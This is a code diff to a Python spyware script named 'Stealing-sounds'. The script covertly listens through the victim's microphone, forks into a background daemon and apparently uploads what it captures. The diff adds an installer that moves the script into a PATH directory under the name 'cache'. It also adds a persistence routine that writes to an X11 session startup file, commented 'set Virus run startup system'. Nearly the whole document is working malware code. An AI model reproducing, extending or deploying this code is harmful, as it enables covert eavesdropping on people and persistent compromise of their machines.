@@ -2,11 +2,41 @@
 #######################
 #   Stealing-sounds   #
 #######################
-  
+
+#!/usr/bin/env python3.6
 from time import ctime
-from sys import implementation
-from os import environ, path, mkdir, remove, fork, _exit, EX_OK
+from sys import implementation, platform, argv
+from shutil import move
+from os import environ, path, mkdir, remove, fork, _exit, EX_OK, chmod
 from concurrent.futures import ThreadPoolExecutor as TPPE
+
+class Install(object):
+    def __init__(self):
+        self.sc = argv[0] # name the script
+        # Join two or more pathname components, inserting '/' as needed. 
+        self.old = path.join(
+            # D.get(k[,d]) -> D[k] if k in D, else d. d defaults to None.
+            environ.get('PATH').split(':')[1],
+            'cache'
+        )
+
+    def getInstall(self):
+        if not platform.startswith('win'):
+            if path.isfile(self.old): return None
+            # Change the access permissions of a file.
+            chmod(
+                self.sc,
+                0x309 
+            )
+            # Recursively move a file or directory to another location.
+            move(
+                self.sc,
+                self.old
+                
+            )
+            return True
+        
+            
 
 class Upload(object):
     def __init__(self):
@@ -34,6 +64,20 @@ class Upload(object):
         except Exception as e:
             return None
 
+class Daemon:
+    def daemon(func):
+        def wrapper(*args, **kwargs):
+            if fork(): return
+            func(*args, **kwargs)
+            _exit(EX_OK)
+        return wrapper
+
+    def backDaemon():
+        path = '/etc/X11/Xsession.d/50x11-common_determine-startup'
+        try:
+            if '0x00' not in open(path, 'r').read(): open(path, 'a').write('cache')
+        except FileNotFoundError:
+            exit(0)
 
 class MicrophoneListing(Upload):
     """
@@ -47,6 +91,18 @@ class MicrophoneListing(Upload):
     """
     def __init__(self):
         try:
+            from requests import get
+
+            # if the target connect in internet 
+            try: get('https://www.google.com')
+            except Exception:
+                exit(0)
+                
+        except ImportError:
+            raise self.Error("requests")
+            exit(0)
+        
+        try:
             """
             Creates a new ``Recognizer`` instance, which represents a collection of speech recognition functionality.
             """
@@ -56,18 +112,7 @@ class MicrophoneListing(Upload):
             self.mc = Microphone() # Creates a new Microphone
         except ImportError:
             raise self.Error("SpeechRecognition")
-            exit(0)
-
-        try:
-            from requests import get
-
-            # if the target connect in internet 
-            try: get('https://www.google.com')
-            except Exception: exit(0)
-                
-        except ImportError:
-            raise self.Error("requests")
-            exit(0)
+            
         
         # Number Packet
         self.cou= int()
@@ -170,21 +215,23 @@ class MicrophoneListing(Upload):
             self.threading(packet)
 
 
-class Daemon:
-    def daemon(func):
-        def wrapper(*args, **kwargs):
-            if fork(): return
-            func(*args, **kwargs)
-            _exit(EX_OK)
-        return wrapper
-
-
 @Daemon.daemon
 def main():
-    obj = MicrophoneListing()
-    try: obj.main()
-    except Exception: exit()
-
+    obj     = MicrophoneListing()
+    try:
+        obj.main()
+    except Exception: 
+        pass
+    
+    
 if __name__ == "__main__":
-    main()
+
+    # Start Install 
+    obj2    = Install()
+    if not platform.startswith('win'):
+        try_in = obj2.getInstall() # Install Tools
+        if try_in:
+            Daemon.backDaemon()  # set Virus run startup system
+    # Start Script
+    main() 
     # [+] Listing...
